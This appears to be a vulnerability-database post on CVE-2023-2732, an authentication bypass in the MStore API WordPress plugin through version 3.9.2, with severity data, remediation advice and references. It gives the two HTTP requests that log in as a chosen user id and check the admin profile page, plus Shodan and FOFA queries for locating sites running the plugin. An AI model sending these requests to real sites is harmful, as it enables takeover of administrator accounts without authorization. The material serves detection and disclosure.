---
layout: post
cve_id: CVE-2023-2732
title: MStore API <= 3.9.2 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2023/CVE-2023-2732.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-2732.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK
severity: critical
impact: 'An attacker can bypass authentication and gain unauthorized access to the
  MStore API, potentially leading to data breaches or unauthorized actions.

  '
remediation: 'Upgrade to a patched version of MStore API (version 3.9.3 or above)
  to mitigate the authentication bypass vulnerability.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/id/f00761a7-fe24-49a3-b3e3-a471e05815c1?source=cve
- https://github.com/RandomRobbieBF/CVE-2023-2732
- https://wordpress.org/plugins/mstore-api/
- https://plugins.trac.wordpress.org/browser/mstore-api/tags/3.9.0/controllers/listing-rest-api/class.api.fields.php#L1079
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2916124%40mstore-api&old=2915729%40mstore-api&sfp_email=&sfph_mail=#file58
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-2732
  cwe-id: CWE-288,NVD-CWE-Other
  epss-score: 0.90424
  epss-percentile: 0.99583
  cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: inspireui
  product: mstore_api
  framework: wordpress
  publicwww-query: /wp-content/plugins/mstore-api/
  shodan-query: http.html:/wp-content/plugins/mstore-api/
  fofa-query: body=/wp-content/plugins/mstore-api/
tags:
- cve2023
- cve
- wordpress
- wp
- wp-plugin
- auth-bypass
- mstore-api
- inspireui
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The MStore API plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 3.9.2. This is due to insufficient verification on the user being supplied during the add listing REST API request through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the user id.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-json/wp/v2/add-listing?id=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
GET /wp-admin/profile.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

